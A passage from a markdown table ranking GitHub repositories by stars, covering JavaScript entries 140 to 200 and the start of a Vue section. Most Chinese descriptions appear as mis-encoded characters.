|140|[we-plugin/we-cropper](https://github.com/we-plugin/we-cropper)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂõæÁâáË£ÅÂâ™Â∑•ÂÖ∑|1.8k|JavaScript|06/08|
|141|[alibaba/form-render](https://github.com/alibaba/form-render)|üö¥‚Äç‚ôÄÔ∏è ÊòìÁî®ÁöÑË∑®ÁªÑ‰ª∂‰ΩìÁ≥ªÁöÑË°®ÂçïÊ∏≤ÊüìÂºïÊìé - ÈÄöËøá JSON Schema Âø´ÈÄüÁîüÊàêËá™ÂÆö‰πâË°®ÂçïÈÖçÁΩÆÁïåÈù¢ |1.8k|JavaScript|10/29|
|142|[dntzhang/cax](https://github.com/dntzhang/cax)|HTML5 Canvas 2D Rendering Engine - Â∞èÁ®ãÂ∫è„ÄÅÂ∞èÊ∏∏Êàè‰ª•Âèä Web ÈÄöÁî® Canvas Ê∏≤ÊüìÂºïÊìé|1.8k|JavaScript|06/15|
|143|[Nealyang/React-Express-Blog-Demo](https://github.com/Nealyang/React-Express-Blog-Demo)|:fire: React+Express+Mongo ->ÂâçÂêéÁ´ØÂçöÂÆ¢ÁΩëÁ´ô :new_moon_with_face:|1.8k|JavaScript|08/12|
|144|[jsfront/month](https://github.com/jsfront/month)|ÂâçÁ´ØÁü•ËØÜÊúàÂàä|1.7k|JavaScript|10/29|
|145|[luoxue-victor/workflow](https://github.com/luoxue-victor/workflow)|Êú¨È°πÁõÆÁöÑÁ¨¨ÂõõÊ¨°Èù©ÂëΩÔºå‰∏çÊ≠¢ÂâçÁ´ØÔºÅ|1.7k|JavaScript|09/05|
|146|[guanguans/notes](https://github.com/guanguans/notes)|:notebook_with_decorative_cover: Linux„ÄÅMySQL„ÄÅNginx„ÄÅPHP„ÄÅGit„ÄÅShell Á≠âÁ¨îËÆ∞|1.7k|JavaScript|09/24|
|147|[logoove/weui](https://github.com/logoove/weui)|weui+ÊòØÂú®weuiÂíåzeptoÂü∫Á°Ä‰∏äÂºÄÂèëÁöÑÂ¢ûÂº∫UIÁªÑ‰ª∂,ÁõÆÂâçÂàÜ‰∏∫Ë°®Âçï,Âü∫Á°Ä,ÁªÑ‰ª∂,jsÊèí‰ª∂ÂõõÂ§ßÁ±ª,ÂÖ±ËÆ°Áôæ‰ΩôÈ°πÂäüËÉΩ,ÊòØÊúÄÂÖ®ÁöÑweuiÊ†∑Âºè|1.7k|JavaScript|09/06|
|148|[treadpit/wx_calendar](https://github.com/treadpit/wx_calendar)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÔºçÊó•ÂéÜÁªÑ‰ª∂ üìÖ|1.7k|JavaScript|10/28|
|149|[hua1995116/webchat](https://github.com/hua1995116/webchat)|:speaker: Websocket project based on vueÔºàÂü∫‰∫évue2.0ÁöÑÂÆûÊó∂ËÅäÂ§©È°πÁõÆÔºâ|1.7k|JavaScript|08/27|
|150|[dai-siki/vue-image-crop-upload](https://github.com/dai-siki/vue-image-crop-upload)|A beautiful vue component for image cropping and uploading. ÔºàvueÂõæÁâáÂâ™Ë£Å‰∏ä‰º†ÁªÑ‰ª∂Ôºâ|1.7k|JavaScript|10/09|
|151|[SuperMonster003/Auto.js_Projects](https://github.com/SuperMonster003/Auto.js_Projects)|Âü∫‰∫éAuto.jsÁöÑËæÖÂä©Â∑•ÂÖ∑È°πÁõÆ (ËöÇËöÅÊ£ÆÊûó)  Auto.js-based assistant tools projects (Ant Forest)|1.7k|JavaScript|10/20|
|152|[mengkunsoft/MKOnlineMusicPlayer](https://github.com/mengkunsoft/MKOnlineMusicPlayer)|‚õîÔºàÂÅúÊ≠¢Áª¥Êä§ÔºâÂ§öÊ∫êÁöÑÂú®Á∫øÈü≥‰πêÊí≠ÊîæÂô®ÔºåÂü∫‰∫é Meting |1.7k|JavaScript|08/18|
|153|[lxk0301/scripts](https://github.com/lxk0301/scripts)|‰∫¨‰∏úËñÖÁæäÊØõÂ∑•ÂÖ∑,  ‰∫¨‰∏úÊ∞¥Êûú„ÄÅÂÆ†Áâ©„ÄÅÁßçË±ÜÁ≠âÁ≠â|1.7k|JavaScript|10/30|
|154|[Wizzercn/NutzWk](https://github.com/Wizzercn/NutzWk)|WKÁ≥ªÂàóÂºÄÂèëÊ°ÜÊû∂-V1Ëá≥V5 JavaÂºÄÊ∫ê‰ºÅ‰∏öÁ∫ßÂºÄÂèëÊ°ÜÊû∂(ÂçïÂ∫îÁî®/ÂæÆÊúçÂä°/ÂàÜÂ∏ÉÂºè)|1.6k|JavaScript|10/25|
|155|[ronggang/PT-Plugin-Plus](https://github.com/ronggang/PT-Plugin-Plus)|PT Âä©Êâã PlusÔºå‰∏∫ Google Chrome Âíå Firefox ÊµèËßàÂô®Êèí‰ª∂ÔºàWeb ExtensionsÔºâÔºå‰∏ªË¶ÅÁî®‰∫éËæÖÂä©‰∏ãËΩΩ PT Á´ôÁöÑÁßçÂ≠ê„ÄÇ|1.6k|JavaScript|10/29|
|156|[kaola-fed/megalo](https://github.com/kaola-fed/megalo)|Âü∫‰∫é Vue ÁöÑÂ∞èÁ®ãÂ∫èÂºÄÂèëÊ°ÜÊû∂|1.6k|JavaScript|09/06|
|157|[lgwebdream/FE-Interview](https://github.com/lgwebdream/FE-Interview)|ÂâçÁ´ØÈù¢ËØïÂøÖÂ§áÈ¢òÂ∫ìÔºå1000+Èù¢ËØïÁúüÈ¢òÔºåHtml„ÄÅCss„ÄÅJavaScript„ÄÅVue„ÄÅReact„ÄÅNode„ÄÅTypeScript„ÄÅWebpack„ÄÅÁÆóÊ≥ï„ÄÅÁΩëÁªú‰∏éÂÆâÂÖ®„ÄÅÊµèËßàÂô®|1.6k|JavaScript|10/29|
|158|[justjavac/Flarum](https://github.com/justjavac/Flarum)|Flarum - ‰ºòÈõÖËá™Áî±ÁöÑ PHP ËΩªÁ§æÂå∫|1.6k|JavaScript|07/15|
|159|[wubaiqing/zaobao](https://github.com/wubaiqing/zaobao)|ÊØèÊó•Êó∂Êä•Ôºå‰ª•ÂâçÁ´ØÊäÄÊúØ‰ΩìÁ≥ª‰∏∫‰∏ªË¶ÅÂàÜ‰∫´ËØæÈ¢ò„ÄÇÊ†πÊçÆÔºöÊñáÁ´†„ÄÅÂ∑•ÂÖ∑„ÄÅÊñ∞Èóª„ÄÅËßÜÈ¢ëÂá†Â§ßÊùøÂùó‰Ωú‰∏∫‰∏ªË¶ÅÂàÜÁ±ª„ÄÇ|1.6k|JavaScript|10/29|
|160|[mumuy/widget](https://github.com/mumuy/widget)|A set of widgets based on jQuery&&javascript. ‰∏ÄÂ•óÂü∫‰∫éjqueryÊàñjavascriptÁöÑÊèí‰ª∂Â∫ì ÔºöËΩÆÊí≠„ÄÅÊ†áÁ≠æÈ°µ„ÄÅÊªöÂä®Êù°„ÄÅ‰∏ãÊãâÊ°Ü„ÄÅÂØπËØùÊ°Ü„ÄÅÊêúÁ¥¢ÊèêÁ§∫„ÄÅÂüéÂ∏ÇÈÄâÊã©(ÂüéÂ∏Ç‰∏âÁ∫ßËÅîÂä®)„ÄÅÊó•ÂéÜÁ≠â|1.6k|JavaScript|10/22|
|161|[fengyuanchen/distpicker](https://github.com/fengyuanchen/distpicker)|‚ö†Ô∏è [Deprecated] No longer maintained. A simple jQuery plugin for picking provinces, cities and districts of China. (‰∏≠ÂõΩ / ÁúÅÂ∏ÇÂå∫ / ‰∏âÁ∫ßËÅîÂä® / Âú∞ÂùÄÈÄâÊã©Âô®)|1.6k|JavaScript|09/30|
|162|[proYang/outils](https://github.com/proYang/outils)|:rocket: ÂâçÁ´Ø‰∏öÂä°‰ª£Á†ÅÂ∑•ÂÖ∑Â∫ì|1.5k|JavaScript|10/09|
|163|[ipcjs/bilibili-helper](https://github.com/ipcjs/bilibili-helper)|ÂêÑÁßçÊ≤πÁå¥ËÑöÊú¨|1.5k|JavaScript|10/17|
|164|[a597873885/webfunny_monitor](https://github.com/a597873885/webfunny_monitor)|ËøôÊòØ‰∏ÄÊ¨æËΩªÈáèÁ∫ßÁöÑÂâçÁ´ØÁõëÊéßÁ≥ªÁªüÔºå‰ª•ÂèäÂâçÁ´ØÊÄßËÉΩÁõëÊéßÁ≥ªÁªüÔºåÂè™ÈúÄÁÆÄÂçïÊìç‰Ωú‰æøÂèØÁßÅÊúâÂåñÈÉ®ÁΩ≤Âà∞Ëá™Â∑±ÁöÑÊúçÂä°Âô®‰∏ä„ÄÇ1.ÂÆûÁé∞Êó†ÂüãÁÇπÁõëÊéßÂâçÁ´ØÊó•ÂøóÔºåÂØπÂâçÁ´ØPV„ÄÅUVÁ≤æÂáÜÂàÜÊûêÔºõ2.ÂØπÁî®Êà∑ÁïôÂ≠òÁéáÂàÜÊûê„ÄÅÁî®Êà∑Ë∑≥Âá∫ÁéáÂàÜÊûêÔºåÁî®Êà∑Âú®È°µÈù¢ÂÅúÁïôÊó∂Èó¥ÂàÜÊûê„ÄÇ3.ÁõëÊéßJSÈîôËØØÔºåÂàÜÊûêjsÊä•ÈîôË∂ãÂäøÔºåÁî®SourceMapÂèçÂêëÂÆö‰ΩçÊ∫êÁ†Å„ÄÇ4.ÁõëÊéßÊé•Âè£ËØ∑Ê±ÇÔºåÂàÜÊûêÊé•Âè£ÁöÑÂ§±Ë¥•ÁéáÔºåÁªüËÆ°ÂàÜÊûêÊé•Âè£ÊÄßËÉΩÔºåÁªüËÆ°ÂàÜÊûêÊé•Âè£ËÄóÊó∂Á≠â„ÄÇ5.ÁõëÊéßÈùôÊÄÅËµÑÊ∫êÂä†ËΩΩÊÉÖÂÜµÔºåÁªüËÆ°ÂàÜÊûêÈùôÊÄÅËµÑÊ∫êÂä†ËΩΩÂ§±Ë¥•ÁöÑÊÉÖÂÜµÔºåÂàÜÊûêÂâçÁ´ØÁôΩÂ±è„ÄÇ6.Êà∑ÁªÜÊü•ÂäüËÉΩÔºåËÆ∞ÂΩï‰∏ãÊØè‰∏™Áî®Êà∑ÁöÑÊâÄÊúâË°å‰∏∫ÔºåÂ§çÁé∞Áîü‰∫ßÁéØÂ¢ÉBug„ÄÇËá™ÂÆö‰πâÂüãÁÇπÂäüËÉΩÔºåÂèØ‰ª•Ëá™ÂÆö‰πâÂüãÁÇπÔºåwebfunny‰ºöÂ∞ÜÂÖ∂ËÆ∞ÂΩï‰∏ãÊù•ÔºåÂπ∂ÂÆöÊó∂ÂàÜÊûê„ÄÇÂêåÊó∂ÂèØ‰ª•ÂØπÂ§ö‰∏™ÂüãÁÇπÊ≠•È™§ËøõË°åÊºèÊñóÂàÜÊûê ...|1.5k|JavaScript|10/23|
|165|[waynecz/dadda-translate-crx](https://github.com/waynecz/dadda-translate-crx)|üê± ÊØîËæÉÂ•ΩÁúãÁöÑ Chrome ÂàíËØçÁøªËØë(ÊêúÁãó)Êèí‰ª∂ÔºåËá™Â∏¶ÁîüËØçÁ∞øÂèäÂêêÂè∏ÂºπËØçËÆ∞ÂøÜÔºåÂèØ‰∏éÊúâÈÅì„ÄÅÊâáË¥ùÂçïËØçÂêåÊ≠•|1.5k|JavaScript|06/26|
|166|[SmallRuralDog/electron-vue-music](https://github.com/SmallRuralDog/electron-vue-music)|Âü∫‰∫é electron-vue ÂºÄÂèëÁöÑÈü≥‰πêÊí≠ÊîæÂô®ÔºåÁïåÈù¢Ê®°‰ªøQQÈü≥‰πêÔºåÊäÄÊúØÊ†àelectron-vue+vue+vuex+vue-router+element- UI„ÄÇÊ¨¢Ëøéstar|1.5k|JavaScript|04/13|
|167|[bobiscool/wxDraw](https://github.com/bobiscool/wxDraw)|A lightweight canvas library which providing 2d draw for weapp  ÂæÆ‰ø°Â∞èÁ®ãÂ∫è2dÂä®ÁîªÂ∫ì üòé  üêº|1.5k|JavaScript|07/17|
|168|[areslabs/alita](https://github.com/areslabs/alita)|‰∏ÄÂ•óÊääReact Native‰ª£Á†ÅËΩ¨Êç¢ÊàêÂæÆ‰ø°Â∞èÁ®ãÂ∫è‰ª£Á†ÅÁöÑËΩ¨Êç¢ÂºïÊìéÂ∑•ÂÖ∑„ÄÇÊàë‰ª¨‰∏çÈÄ†ËΩÆÂ≠êÔºå‰∏çÂèëÊòéÊñ∞Ê°ÜÊû∂ÔºåÂè™ÊòØÊèê‰æõÂ∑•ÂÖ∑ÊääRNÊâ©Â±ïÂà∞ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁ´Ø„ÄÇ|1.5k|JavaScript|08/14|
|169|[metowolf/vCards](https://github.com/metowolf/vCards)|üì°Ô∏è vCards ‰∏≠ÂõΩÈªÑÈ°µ - ‰ºòÂåñ iOS/Android Êù•Áîµ„ÄÅ‰ø°ÊÅØÁïåÈù¢‰ΩìÈ™å|1.5k|JavaScript|08/26|
|170|[iBase4J/iBase4J](https://github.com/iBase4J/iBase4J)|SpringÔºåSpringBoot 2.0ÔºåSpringMVCÔºåMybatisÔºåmybatis-plusÔºåmotan/dubboÂàÜÂ∏ÉÂºèÔºåRedisÁºìÂ≠òÔºåShiroÊùÉÈôêÁÆ°ÁêÜÔºåSpring-SessionÂçïÁÇπÁôªÂΩïÔºåQuartzÂàÜÂ∏ÉÂºèÈõÜÁæ§Ë∞ÉÂ∫¶ÔºåRestfulÊúçÂä°ÔºåQQ/ÂæÆ‰ø°ÁôªÂΩïÔºåApp tokenÁôªÂΩïÔºåÂæÆ‰ø°/ÊîØ‰ªòÂÆùÊîØ‰ªòÔºõÊó•ÊúüËΩ¨Êç¢„ÄÅÊï∞ÊçÆÁ±ªÂûãËΩ¨Êç¢„ÄÅÂ∫èÂàóÂåñ„ÄÅÊ±âÂ≠óËΩ¨ÊãºÈü≥„ÄÅË∫´‰ªΩËØÅÂè∑Á†ÅÈ™åËØÅ„ÄÅÊï∞Â≠óËΩ¨‰∫∫Ê∞ëÂ∏Å„ÄÅÂèëÈÄÅÁü≠‰ø°„ÄÅÂèëÈÄÅÈÇÆ‰ª∂„ÄÅÂä†ÂØÜËß£ÂØÜ„ÄÅÂõæÁâáÂ§ÑÁêÜ„ÄÅexcelÂØºÂÖ•ÂØºÂá∫„ÄÅFTP/SFTP/fastDFS‰∏ä‰º†‰∏ãËΩΩ„ÄÅ‰∫åÁª¥Á†Å„ÄÅXMLËØªÂÜô„ÄÅÈ´òÁ≤æÂ∫¶ËÆ°ÁÆó„ÄÅÁ≥ªÁªüÈÖçÁΩÆÂ∑•ÂÖ∑Á±ªÁ≠âÁ≠â„ÄÇ|1.5k|JavaScript|06/06|
|171|[lisong/code-push-server](https://github.com/lisong/code-push-server)|CodePush service is hot update services which adapter react-native-code-push and cordova-plugin-code-push - ÁÉ≠Êõ¥Êñ∞|1.5k|JavaScript|09/04|
|172|[nmxiaowei/avue](https://github.com/nmxiaowei/avue)|Avue.js2.0ÊòØÂü∫‰∫éÁé∞ÊúâÁöÑelement-uiÂ∫ìËøõË°åÁöÑ‰∫åÊ¨°Â∞ÅË£ÖÔºåÁÆÄÂåñ‰∏Ä‰∫õÁπÅÁêêÁöÑÊìç‰ΩúÔºåÊ†∏ÂøÉÁêÜÂøµ‰∏∫Êï∞ÊçÆÈ©±Âä®ËßÜÂõæ,‰∏ªË¶ÅÁöÑÁªÑ‰ª∂Â∫ìÈíàÂØπtableË°®Ê†ºÂíåformË°®ÂçïÂú∫ÊôØÔºåÂêåÊó∂Ë°çÁîüÂá∫Êõ¥Â§ö‰ºÅ‰∏öÂ∏∏Áî®ÁöÑÁªÑ‰ª∂ÔºåËææÂà∞È´òÂ§çÁî®ÔºåÂÆπÊòìÁª¥Êä§ÂíåÊâ©Â±ïÁöÑÊ°ÜÊû∂ÔºåÂêåÊó∂ÂÜÖÁΩÆ‰∫Ü‰∏∞ÂØå‰∫ÜÊï∞ÊçÆÂ±ïÁ§∫ÁªÑ‰ª∂ÔºåËÆ©ÂºÄÂèëÂèòÂæóÊõ¥Âä†ÂÆπÊòì|1.5k|JavaScript|10/30|
|173|[coderwhy/HYMiniMall](https://github.com/coderwhy/HYMiniMall)|Â∞èÁ®ãÂ∫èÂïÜÂú∫È°πÁõÆ|1.4k|JavaScript|09/09|
|174|[sleepybear1113/taobaoVisitingVenues](https://github.com/sleepybear1113/taobaoVisitingVenues)|‰∫¨‰∏ú/Ê∑òÂÆùÁöÑËá™Âä®ÊµèËßàÈÄõÂ∫óËÑöÊú¨|1.4k|JavaScript|10/22|
|175|[mynane/PDF](https://github.com/mynane/PDF)|Êî∂ÈõÜÁöÑÂêÑÁßçËµÑÊ∫ê|1.4k|JavaScript|07/14|
|176|[Tomotoes/scrcpy-gui](https://github.com/Tomotoes/scrcpy-gui)|üëª A simple & beautiful GUI application for scrcpy. QQÁæ§:734330215|1.4k|JavaScript|10/25|
|177|[edusoho/edusoho](https://github.com/edusoho/edusoho)|EduSoho ÁΩëÁªúËØæÂ†ÇÊòØÁî±Êù≠Â∑ûÈòîÁü•ÁΩëÁªúÁßëÊäÄÊúâÈôêÂÖ¨Âè∏Á†îÂèëÁöÑÂºÄÊ∫êÁΩëÊ†°Á≥ªÁªü„ÄÇEduSoho ÂåÖÂê´‰∫ÜÂú®Á∫øÊïôÂ≠¶„ÄÅÊãõÁîüÂíåÁÆ°ÁêÜÁ≠âÂÆåÊï¥ÂäüËÉΩÔºåËÆ©ÊïôËÇ≤Êú∫ÊûÑÂèØ‰ª•Èõ∂Èó®ÊßõÂª∫Á´ãÁΩëÊ†°ÔºåÊàêÂäüËΩ¨ÂûãÂú®Á∫øÊïôËÇ≤„ÄÇEduSoho ‰πüÂèØ‰Ωú‰∏∫‰ºÅ‰∏öÂÜÖËÆ≠Âπ≥Âè∞ÔºåÂ∏ÆÂä©‰ºÅ‰∏öÂÆûÁé∞‰∫∫ÊâçÂüπÂÖª„ÄÇ|1.4k|JavaScript|09/23|
|178|[yioMe/nodejs_wx_aipay_api](https://github.com/yioMe/nodejs_wx_aipay_api)|ÂæÆ‰ø°ÊîØ‰ªòÂÆù‰∏™‰∫∫ÂÖçÁ≠æÊî∂Ê¨æApiÁ≥ªÁªüÔºåÊúâ‰∫ÜÂÆÉÂØπÊé•ÂÜç‰πü‰∏çÁî®ÊãÖÂøÉÊàëÁöÑ‰∏öÂä°‰∏çËÉΩÊîØ‰ªò‰∫Ü|1.4k|JavaScript|10/27|
|179|[cnodejs/egg-cnode](https://github.com/cnodejs/egg-cnode)|CNode Á§æÂå∫ Egg ÁâàÊú¨|1.4k|JavaScript|05/01|
|180|[nodeWechat/wechat4u](https://github.com/nodeWechat/wechat4u)|ÂæÆ‰ø° wechat web ÁΩëÈ°µÁâàÊé•Âè£ÁöÑ JavaScript ÂÆûÁé∞ÔºåÂÖºÂÆπNodeÂíåÊµèËßàÂô®ÔºåÂæÆ‰ø°Êú∫Âô®‰∫∫|1.4k|JavaScript|09/03|
|181|[zhaoolee/OnlineToolsBook](https://github.com/zhaoolee/OnlineToolsBook)|üç≠Âú®Á∫øÂ∑•ÂÖ∑ÁßòÁ±ç,‰∏∫Âú®Á∫øÂ∑•ÂÖ∑ÂÜô‰∏ÄÊú¨‰ºòË¥®ËØ¥Êòé‰π¶,ËÆ©Âú®Á∫øÂ∑•ÂÖ∑ÈÄ†Á¶è‰∫∫Á±ª~ Online tool cheats, write a quality manual for online tools, make online tools benefit humanity~|1.4k|JavaScript|10/21|
|182|[sanyuan0704/react-cloud-music](https://github.com/sanyuan0704/react-cloud-music)|React 16.8ÊâìÈÄ†Á≤æÁæéÈü≥‰πêWebApp|1.4k|JavaScript|09/18|
|183|[thinkgem/jeesite4](https://github.com/thinkgem/jeesite4)|Java EE ‰ºÅ‰∏öÁ∫ßÂø´ÈÄüÂºÄÂèëÂπ≥Âè∞ÔºåÂü∫‰∫éÁªèÂÖ∏ÊäÄÊúØÁªÑÂêàÔºàSpring Boot„ÄÅSpring MVC„ÄÅApache Shiro„ÄÅMyBatis„ÄÅBeetl„ÄÅBootstrap„ÄÅAdminLTEÔºâÔºåÂú®Á∫ø‰ª£Á†ÅÁîüÊàêÂäüËÉΩÔºåÂåÖÊã¨Ê†∏ÂøÉÊ®°ÂùóÂ¶ÇÔºöÁªÑÁªáÊú∫ÊûÑ„ÄÅËßíËâ≤Áî®Êà∑„ÄÅËèúÂçïÂèäÊåâÈíÆÊéàÊùÉ„ÄÅÊï∞ÊçÆÊùÉÈôê„ÄÅÁ≥ªÁªüÂèÇÊï∞„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÂ∑•‰ΩúÊµÅÁ≠â„ÄÇÈááÁî®ÊùæËÄ¶ÂêàËÆæËÆ°ÔºõÁïåÈù¢Êó†Âà∑Êñ∞Ôºå‰∏ÄÈîÆÊç¢ËÇ§Ôºõ‰ºóÂ§öË¥¶Âè∑ÂÆâÂÖ®ËÆæÁΩÆÔºåÂØÜÁ†ÅÁ≠ñÁï•ÔºõÂú®Á∫øÂÆöÊó∂‰ªªÂä°ÈÖçÁΩÆÔºõÊîØÊåÅÈõÜÁæ§ÔºåÊîØÊåÅSAASÔºõÊîØÊåÅÂ§öÊï∞ÊçÆÊ∫ê|1.4k|JavaScript|10/27|
|184|[threadshare/php](https://github.com/threadshare/php)|‰∏∫ÂàöÂàöÂ≠¶‰π†phpËØ≠Ë®Ä‰ª•ÂèäwebÁΩëÁ´ôÂºÄÂèëÊï¥ÁêÜÁöÑ‰∏ÄÂ•óËµÑÊ∫êÔºåÊúâËßÜÈ¢ëÔºåÂÆûÊàò‰ª£Á†ÅÔºåÂ≠¶‰π†Ë∑ØÂæÑÁ≠â„ÄÇ‰ºöÊåÅÁª≠Êõ¥Êñ∞„ÄÇ„ÄÇ„ÄÇ|1.4k|JavaScript|02/17|
|185|[tencentyun/TIMSDK](https://github.com/tencentyun/TIMSDK)|ËÖæËÆØ‰∫ëÂç≥Êó∂ÈÄö‰ø° IM ÊúçÂä°ÔºåÂõΩÂÜÖ‰∏ãËΩΩÈïúÂÉèÔºö|1.3k|JavaScript|10/27|
|186|[LANIF-UI/dva-boot-admin](https://github.com/LANIF-UI/dva-boot-admin)|:cake: react admin dashboard ui LANIF-ADMIN --- react 16 + react-router 4 + dva 2 + antd 4 ÂêéÂè∞ÁÆ°ÁêÜ ËÑöÊâãÊû∂|1.3k|JavaScript|09/29|
|187|[phalapi/phalapi](https://github.com/phalapi/phalapi)|A PHP framework foucs on API fast development.Êé•Âè£Ôºå‰ªéÁÆÄÂçïÂºÄÂßãÔºÅPhalApiÁÆÄÁß∞œÄÊ°ÜÊû∂Ôºå‰∏Ä‰∏™ËΩªÈáèÁ∫ßPHPÂºÄÊ∫êÊé•Âè£Ê°ÜÊû∂Ôºå‰∏ìÊ≥®‰∫éÊé•Âè£ÊúçÂä°ÂºÄÂèë„ÄÇ|1.3k|JavaScript|10/29|
|188|[xland/xiangxuema](https://github.com/xland/xiangxuema)|‚ÄúÊÉ≥Â≠¶Âêó‚Äù‰∏™‰∫∫Áü•ËØÜÁÆ°ÁêÜ‰∏éËá™Â™í‰ΩìËê•ÈîÄÂ∑•ÂÖ∑|1.3k|JavaScript|07/07|
|189|[f2e-awesome/knowledge](https://github.com/f2e-awesome/knowledge)|ÊñáÊ°£ÁùÄÈáçÊûÑÂª∫‰∏Ä‰∏™ÂÆåÊï¥ÁöÑ„ÄåÂâçÁ´ØÊäÄÊúØÊû∂ÊûÑÂõæË∞±„ÄçÔºåÊñπ‰æø F2E(Front End EngineeringÂèàÁß∞FEE„ÄÅF2E) Â≠¶‰π†‰∏éËøõÈò∂„ÄÇ|1.3k|JavaScript|07/16|
|190|[teadocs/numpy-cn](https://github.com/teadocs/numpy-cn)|NumPyÂÆòÊñπ‰∏≠ÊñáÊñáÊ°£ÔºàÂÆåÊï¥ÁâàÔºâ|1.3k|JavaScript|10/17|
|191|[sbfkcel/towxml](https://github.com/sbfkcel/towxml)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èHTML„ÄÅMarkdownÊ∏≤ÊüìÂ∫ì|1.3k|JavaScript|09/25|
|192|[dubboclub/dubbokeeper](https://github.com/dubboclub/dubbokeeper)|dubboÊúçÂä°ÁÆ°ÁêÜ‰ª•ÂèäÁõëÊéßÁ≥ªÁªü|1.3k|JavaScript|07/03|
|193|[xiongwilee/Gracejs](https://github.com/xiongwilee/Gracejs)|A Nodejs BFF framework, build with koa2ÔºàÂü∫‰∫ékoa2ÁöÑÊ†áÂáÜÂâçÂêéÁ´ØÂàÜÁ¶ªÊ°ÜÊû∂Ôºâ|1.3k|JavaScript|07/19|
|194|[purplebamboo/font-carrier](https://github.com/purplebamboo/font-carrier)|font-carrierÊòØ‰∏Ä‰∏™ÂäüËÉΩÂº∫Â§ßÁöÑÂ≠ó‰ΩìÊìç‰ΩúÂ∫ìÔºå‰ΩøÁî®ÂÆÉ‰Ω†ÂèØ‰ª•ÈöèÂøÉÊâÄÊ¨≤ÁöÑÊìç‰ΩúÂ≠ó‰Ωì„ÄÇËÆ©‰Ω†ÂèØ‰ª•Âú®svgÁöÑÁª¥Â∫¶ÊîπÈÄ†Â≠ó‰ΩìÁöÑÂ±ïÁé∞ÂΩ¢Áä∂„ÄÇ|1.3k|JavaScript|04/03|
|195|[ctripcorp/CRN](https://github.com/ctripcorp/CRN)|CRNÊòØCtrip React NativeÁÆÄÁß∞ÔºåÁî±Êê∫Á®ãÊó†Á∫øÂπ≥Âè∞Á†îÂèëÂõ¢ÈòüÂü∫‰∫éReact NativeÊ°ÜÊû∂‰ºòÂåñÔºåÂÆöÂà∂ÊàêÁ®≥ÂÆöÊÄßÂíåÊÄßËÉΩÊõ¥‰Ω≥„ÄÅ‰πüÊõ¥ÈÄÇÂêà‰∏öÂä°Âú∫ÊôØÁöÑË∑®Âπ≥Âè∞ÂºÄÂèëÊ°ÜÊû∂„ÄÇ|1.3k|JavaScript|10/16|
|196|[gengchen528/wechatBot](https://github.com/gengchen528/wechatBot)|ÂæÆ‰ø°ÊØèÊó•ËØ¥Ôºå‰∏âÊ≠•Êïô‰Ω†Áî®NodeÂÅö‰∏Ä‰∏™ÂæÆ‰ø°ÂìÑÂ•≥Âèã(Âü∫Âèã)Á•ûÂô®ÔºÅËøòËÉΩÂ∏ÆÂ•≥ÊúãÂèãËß£ÂÜ≥ÂûÉÂúæÂàÜÁ±ªÈöæÈ¢ò|1.3k|JavaScript|05/11|
|197|[karsonzhang/fastadmin](https://github.com/karsonzhang/fastadmin)|Âü∫‰∫é ThinkPHP5 Âíå Bootstrap ÁöÑÊûÅÈÄüÂêéÂè∞ÂºÄÂèëÊ°ÜÊû∂Ôºå‰∏ÄÈîÆÁîüÊàê CRUDÔºåËá™Âä®ÁîüÊàêÊéßÂà∂Âô®„ÄÅÊ®°Âûã„ÄÅËßÜÂõæ„ÄÅJS„ÄÅËØ≠Ë®ÄÂåÖ„ÄÅËèúÂçï„ÄÅÂõûÊî∂Á´ô„ÄÇ|1.3k|JavaScript|10/21|
|198|[u014427391/jeeplatform](https://github.com/u014427391/jeeplatform)|‰∏ÄÊ¨æ‰ºÅ‰∏ö‰ø°ÊÅØÂåñÂºÄÂèëÂü∫Á°ÄÂπ≥Âè∞ÔºåÊãüÈõÜÊàêOA(ÂäûÂÖ¨Ëá™Âä®Âåñ)„ÄÅCMS(ÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü)Á≠â‰ºÅ‰∏öÁ≥ªÁªüÁöÑÈÄöÁî®‰∏öÂä°ÂäüËÉΩ  JeePlatformÈ°πÁõÆÊòØ‰∏ÄÊ¨æ‰ª•SpringBoot‰∏∫Ê†∏ÂøÉÊ°ÜÊû∂ÔºåÈõÜORMÊ°ÜÊû∂MybatisÔºåWebÂ±ÇÊ°ÜÊû∂SpringMVCÂíåÂ§öÁßçÂºÄÊ∫êÁªÑ‰ª∂Ê°ÜÊû∂ËÄåÊàêÁöÑ‰∏ÄÊ¨æÈÄöÁî®Âü∫Á°ÄÂπ≥Âè∞Ôºå‰ª£Á†ÅÂ∑≤ÁªèÊçêËµ†ÁªôÂºÄÊ∫ê‰∏≠ÂõΩÁ§æÂå∫|1.2k|JavaScript|07/02|
|199|[nodejscn/node-api-cn](https://github.com/nodejscn/node-api-cn)|Node.js API ‰∏≠ÊñáÊñáÊ°£|1.2k|JavaScript|10/18|
|200|[ciaochaos/qrbtf](https://github.com/ciaochaos/qrbtf)|An art QR code (qrcode) beautifier.  Ëâ∫ÊúØ‰∫åÁª¥Á†ÅÁîüÊàêÂô®„ÄÇhttps://qrbtf.com|1.2k|JavaScript|09/02|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## Vue

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[bailicangdu/vue2-elm](https://github.com/bailicangdu/vue2-elm)|Âü∫‰∫é vue2 + vuex ÊûÑÂª∫‰∏Ä‰∏™ÂÖ∑Êúâ 45 ‰∏™È°µÈù¢ÁöÑÂ§ßÂûãÂçïÈ°µÈù¢Â∫îÁî®|34.7k|Vue|09/27|
|2|[lin-xin/vue-manage-system](https://github.com/lin-xin/vue-manage-system)|Âü∫‰∫évue + elementÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüËß£ÂÜ≥ÊñπÊ°à|11.4k|Vue|10/19|
|3|[bailicangdu/vue2-manage](https://github.com/bailicangdu/vue2-manage)|Âü∫‰∫é vue + element-ui ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|10.0k|Vue|08/31|
|4|[weilanwl/ColorUI](https://github.com/weilanwl/ColorUI)|È≤ú‰∫ÆÁöÑÈ´òÈ•±ÂíåËâ≤ÂΩ©Ôºå‰∏ìÊ≥®ËßÜËßâÁöÑÂ∞èÁ®ãÂ∫èÁªÑ‰ª∂Â∫ì|9.6k|Vue|10/18|
